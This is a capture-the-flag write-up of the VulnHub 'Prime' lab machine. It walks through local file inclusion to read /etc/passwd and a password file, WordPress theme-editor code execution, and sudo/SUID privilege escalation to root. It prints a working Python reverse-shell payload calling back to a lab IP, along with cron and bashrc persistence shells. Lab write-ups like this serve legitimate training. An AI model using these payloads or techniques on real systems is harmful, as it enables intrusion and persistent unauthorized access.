# prime
[vulnhub link](https://download.vulnhub.com/prime/Prime_Series_Level-1.rar)

## recon
### poking around
victor is a username for the wp site, seen http://target/wordpress/ and verified at http://target/wordpress/wp-login.php

### dirb
*dirb http://target -X .php,.txt*

found http://target/secret.txt, it references a location.txt github page that reference "file" as a payload

navigating to http://target/index.php?file=/etc/passwd returns,
	
	Do something better, you are digging wrong file

referencing the dirb output, navigating to http://target/index.php?file=location.txt returns,
	
	ok well Now you reah at the exact parameter
	Now dig some more for next one
	use 'secrettier360' parameter on some other php page for more fun

following the directions takes you too http://target/image.php?secrettier360=/etc/passwd, which succeeds! a user named saket left a interesting message
	
	saket:x:1001:1001:find password.txt file in my directory:/home/saket

using that, we navigate to http://target/image.php?secrettier360=/home/saket/password.txt
	
	follow_the_ippsec

## exploitation
credentials
	
	wp-login:victor:follow_the_ippsec

There is a file PHP file (in theme editor) named secret.php that is wrtable, I put a python reverse shell in the file
	
	<?php system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.12",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''); ?>

## persistence
Put a copy in /dev/shm/secret.php for LFI

put python reverse shell on * * * * * on www-data's crontab that calls back to 5253, set using my linux persistance tool, [linper](https://github.com/montyonsecurity/linper)

## privesc
### poking around
/opt/backup/server_database/backup_pass
	
	your password for backup_database file enc is 
	"backup_password"
	Enjoy!

### linenum
	[+] We can sudo without supplying a password!
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User www-data may run the following commands on ubuntu:
	    (root) NOPASSWD: /home/saket/enc

### exploiting suid
Supplied password from /opt to enc, got enc.txt and key.txt


enc.txt
	
	nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=

Looks like AES

key.txt

	I know you are the fan of ippsec.

	So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.

following the directions in key.txt gives us 366a74cb3c959de17d61db30591c39d1
	
	echo -n ippsec | md5sum
	366a74cb3c959de17d61db30591c39d1

Decrypted enc.txt using https://www.devglan.com/online-tools/aes-encryption-decryption

	Dont worry saket one day we will reach toour destination very soon. And if you forget your username then use your old password==> "tribute_to_ippsec"Victor,

credentials
	
	wp-login:victor:follow_the_ippsec
	ssh:saket:tribute_to_ippsec

### privesc to root
ssh in with saket credentials

re-running linenum, providing saket's credentials, returns a suid enabled file, /home/victor/undefeated_victor

running /home/victor/undefeated_victor returns an error saying it cannot open /tmp/challenge which suggets it is trying to run it and it does not exist. putting [linper](https://github.com/montyonsecurity/linper) in /tmp/challenge and re-running
	
	saket@ubuntu:/dev/shm$ chmod +x linper.sh
	saket@ubuntu:/dev/shm$ cp linper.sh /tmp/challenge
	saket@ubuntu:/dev/shm$ sudo /home/victor/undefeated_victor
	if you can defeat me then challenge me in front of you
	[+] Netcat reverse shell placed in root's bashrc
	[+] Calls back to 192.168.56.12:1337
	[+] Python reverse shell written to root's crontab
	[+] Calls back to 192.168.56.12:1337
	[+] Python reverse shell placed in root's bashrc
	[+] Calls back to 192.168.56.12:1337

setup the listener and you have root
	
	monty@client-10-228-71-23:~/ctfs/vulnhub/prime/www$ nc -lnvp 1337
	listening on [any] 1337 ...
	connect to [192.168.56.12] from (UNKNOWN) [target] 56770
	/bin/sh: 0: can't access tty; job control turned off
	\# id
	uid=0(root) gid=0(root) groups=0(root) 
